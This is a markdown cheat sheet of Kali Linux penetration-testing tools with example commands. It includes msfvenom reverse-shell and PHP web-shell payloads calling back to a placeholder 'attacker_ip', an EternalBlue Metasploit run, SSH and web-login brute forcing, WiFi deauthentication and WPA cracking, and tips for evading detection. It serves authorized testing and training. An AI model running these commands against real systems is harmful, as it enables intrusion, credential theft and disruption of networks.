# Kali Linux Tools Reference for Penetration Testing

## Overview
This document provides a comprehensive reference for Kali Linux tools commonly used in penetration testing, organized by category and use case.

## Information Gathering Tools

### Network Discovery
- **nmap**: Network exploration and security auditing
  ```bash
  # Basic scan
  nmap target_ip
  
  # Service version detection
  nmap -sV target_ip
  
  # OS detection
  nmap -O target_ip
  
  # Aggressive scan
  nmap -A target_ip
  
  # Scan all ports
  nmap -p- target_ip
  
  # UDP scan
  nmap -sU target_ip
  
  # Script scanning
  nmap --script vuln target_ip
  ```

- **masscan**: High-speed port scanner
  ```bash
  # Fast port scan
  masscan -p1-65535 target_ip --rate=1000
  
  # Scan specific ports
  masscan -p80,443,8080 target_range --rate=1000
  ```

- **zmap**: Internet-wide network scanner
  ```bash
  # Scan for open port 80 on entire subnet
  zmap -p 80 192.168.1.0/24
  ```

### DNS Enumeration
- **dnsrecon**: DNS enumeration script
  ```bash
  # Basic DNS enumeration
  dnsrecon -d target.com
  
  # Zone transfer attempt
  dnsrecon -d target.com -t axfr
  
  # Subdomain brute force
  dnsrecon -d target.com -t brt
  ```

- **dnsenum**: DNS enumeration tool
  ```bash
  # Comprehensive DNS enumeration
  dnsenum target.com
  
  # With custom wordlist
  dnsenum --dnsserver 8.8.8.8 -f /usr/share/wordlists/dnsmap.txt target.com
  ```

- **fierce**: DNS reconnaissance tool
  ```bash
  # Domain reconnaissance
  fierce --domain target.com
  
  # With custom wordlist
  fierce --domain target.com --wordlist /path/to/wordlist.txt
  ```

### OSINT (Open Source Intelligence)
- **theharvester**: Email and subdomain gathering
  ```bash
  # Search for emails and subdomains
  theharvester -d target.com -b google
  
  # Multiple sources
  theharvester -d target.com -b google,bing,yahoo
  
  # Limit results
  theharvester -d target.com -b google -l 100
  ```

- **recon-ng**: Web reconnaissance framework
  ```bash
  # Start recon-ng
  recon-ng
  
  # Load module
  modules load recon/domains-hosts/google_site_web
  
  # Set options
  options set SOURCE target.com
  
  # Run module
  run
  ```

- **maltego**: Link analysis tool (GUI-based)

### Web Application Reconnaissance
- **gobuster**: Directory and file brute-forcer
  ```bash
  # Directory enumeration
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
  
  # With extensions
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
  
  # Subdomain enumeration
  gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt
  ```

- **dirb**: Web content scanner
  ```bash
  # Basic directory scan
  dirb http://target.com
  
  # With custom wordlist
  dirb http://target.com /usr/share/wordlists/dirb/big.txt
  
  # With extensions
  dirb http://target.com -X .php,.html,.txt
  ```

- **dirbuster**: GUI directory brute-forcer

## Vulnerability Assessment Tools

### Web Application Scanners
- **nikto**: Web server scanner
  ```bash
  # Basic scan
  nikto -h http://target.com
  
  # Scan with specific port
  nikto -h http://target.com:8080
  
  # Output to file
  nikto -h http://target.com -o nikto_results.txt
  ```

- **wpscan**: WordPress vulnerability scanner
  ```bash
  # Basic WordPress scan
  wpscan --url http://target.com
  
  # Enumerate users
  wpscan --url http://target.com --enumerate u
  
  # Enumerate plugins
  wpscan --url http://target.com --enumerate p
  
  # Aggressive scan
  wpscan --url http://target.com --enumerate ap,at,cb,dbe
  ```

### Network Vulnerability Scanners
- **openvas**: Comprehensive vulnerability scanner (GUI-based)
- **nuclei**: Fast vulnerability scanner
  ```bash
  # Basic scan
  nuclei -u http://target.com
  
  # Scan with specific templates
  nuclei -u http://target.com -t /path/to/templates/
  
  # Scan multiple targets
  nuclei -l targets.txt
  ```

## Web Application Testing Tools

### Proxy Tools
- **burpsuite**: Web application security testing platform
  - Intercepting proxy
  - Scanner
  - Intruder
  - Repeater
  - Sequencer

- **owasp-zap**: Web application security scanner
  ```bash
  # Start ZAP in daemon mode
  zap.sh -daemon -port 8080
  
  # Quick scan
  zap-cli quick-scan http://target.com
  
  # Full scan
  zap-cli active-scan http://target.com
  ```

### SQL Injection Tools
- **sqlmap**: SQL injection exploitation tool
  ```bash
  # Basic SQL injection test
  sqlmap -u "http://target.com/page.php?id=1"
  
  # Test with POST data
  sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin"
  
  # Enumerate databases
  sqlmap -u "http://target.com/page.php?id=1" --dbs
  
  # Enumerate tables
  sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
  
  # Dump table data
  sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
  ```

- **sqlninja**: SQL Server injection tool

## Password Attack Tools

### Password Crackers
- **john**: Password cracker
  ```bash
  # Crack password hashes
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  
  # Show cracked passwords
  john --show hashes.txt
  
  # Crack with rules
  john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  ```

- **hashcat**: Advanced password recovery
  ```bash
  # Crack MD5 hashes
  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  
  # Crack NTLM hashes
  hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  
  # Brute force attack
  hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
  ```

### Network Login Crackers
- **hydra**: Network logon cracker
  ```bash
  # SSH brute force
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip
  
  # HTTP POST form brute force
  hydra -l admin -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
  
  # FTP brute force
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target_ip
  ```

- **medusa**: Speedy, parallel, modular login brute-forcer
  ```bash
  # SSH brute force
  medusa -h target_ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
  
  # Multiple hosts
  medusa -H hosts.txt -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
  ```

## Wireless Attack Tools

### WiFi Security Testing
- **aircrack-ng**: WiFi security auditing tools
  ```bash
  # Monitor mode
  airmon-ng start wlan0
  
  # Capture packets
  airodump-ng wlan0mon
  
  # Capture specific network
  airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
  
  # Deauth attack
  aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
  
  # Crack WPA/WPA2
  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
  ```

- **reaver**: WPS attack tool
  ```bash
  # WPS brute force
  reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
  ```

- **wifite**: Automated wireless attack tool
  ```bash
  # Automated WiFi attack
  wifite
  
  # Attack specific network
  wifite --bssid AA:BB:CC:DD:EE:FF
  ```

## Exploitation Frameworks

### Metasploit Framework
- **msfconsole**: Main Metasploit interface
  ```bash
  # Start Metasploit
  msfconsole
  
  # Search for exploits
  search type:exploit platform:windows
  
  # Use exploit
  use exploit/windows/smb/ms17_010_eternalblue
  
  # Set options
  set RHOSTS target_ip
  set LHOST attacker_ip
  
  # Run exploit
  exploit
  ```

- **msfvenom**: Payload generator
  ```bash
  # Windows reverse shell
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
  
  # Linux reverse shell
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
  
  # PHP web shell
  msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php
  ```

### Social Engineering
- **social-engineer-toolkit (SET)**: Social engineering framework
  ```bash
  # Start SET
  setoolkit
  
  # Spear-phishing attack vectors
  # Website attack vectors
  # Infectious media generator
  # Create payload and listener
  ```

## Post-Exploitation Tools

### Privilege Escalation
- **linux-exploit-suggester**: Linux privilege escalation
  ```bash
  # Suggest exploits
  ./linux-exploit-suggester.sh
  ```

- **windows-exploit-suggester**: Windows privilege escalation
  ```bash
  # Generate system info
  systeminfo > systeminfo.txt
  
  # Suggest exploits
  python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
  ```

### Network Pivoting
- **proxychains**: Proxy chains
  ```bash
  # Configure proxychains
  vim /etc/proxychains.conf
  
  # Use with tools
  proxychains nmap target_ip
  ```

- **sshuttle**: VPN over SSH
  ```bash
  # Create VPN tunnel
  sshuttle -r user@pivot_host 192.168.1.0/24
  ```

## Forensics Tools

### Memory Analysis
- **volatility**: Memory forensics framework
  ```bash
  # Identify OS profile
  volatility -f memory.dump imageinfo
  
  # List processes
  volatility -f memory.dump --profile=Win7SP1x64 pslist
  
  # Extract process
  volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D ./
  ```

### File Analysis
- **binwalk**: Firmware analysis tool
  ```bash
  # Analyze firmware
  binwalk firmware.bin
  
  # Extract files
  binwalk -e firmware.bin
  ```

- **strings**: Extract strings from files
  ```bash
  # Extract strings
  strings binary_file
  
  # Extract printable strings
  strings -a binary_file
  ```

## Reporting Tools

### Documentation
- **dradis**: Collaboration and reporting platform
- **faraday**: Integrated penetration test environment
- **magictree**: Penetration testing productivity tool

### Screenshot Tools
- **scrot**: Command line screen capture
  ```bash
  # Take screenshot
  scrot screenshot.png
  
  # Take screenshot with delay
  scrot -d 5 screenshot.png
  ```

## Wordlists and Dictionaries

### Common Wordlists
- `/usr/share/wordlists/rockyou.txt`: Most common passwords
- `/usr/share/wordlists/dirb/`: Directory enumeration wordlists
- `/usr/share/wordlists/dirbuster/`: Directory brute force wordlists
- `/usr/share/wordlists/wfuzz/`: Web fuzzing wordlists
- `/usr/share/wordlists/metasploit/`: Metasploit wordlists

### Custom Wordlist Generation
- **crunch**: Wordlist generator
  ```bash
  # Generate wordlist
  crunch 8 8 -t @@@@@@%% -o wordlist.txt
  
  # Generate with charset
  crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
  ```

- **cewl**: Custom word list generator
  ```bash
  # Generate wordlist from website
  cewl http://target.com -w wordlist.txt
  
  # With minimum word length
  cewl http://target.com -m 6 -w wordlist.txt
  ```

## Best Practices for Tool Usage

### Tool Selection
1. Choose the right tool for the specific task
2. Understand tool limitations and capabilities
3. Keep tools updated to latest versions
4. Verify tool output with manual testing

### Operational Security
1. Use VPNs and proxies when appropriate
2. Rotate source IPs and user agents
3. Implement rate limiting to avoid detection
4. Clean up artifacts after testing

### Documentation
1. Log all commands and outputs
2. Take screenshots of important findings
3. Document tool versions and configurations
4. Maintain detailed testing notes

### Legal and Ethical Considerations
1. Only use tools on authorized targets
2. Respect scope limitations
3. Report critical vulnerabilities immediately
4. Follow responsible disclosure practices
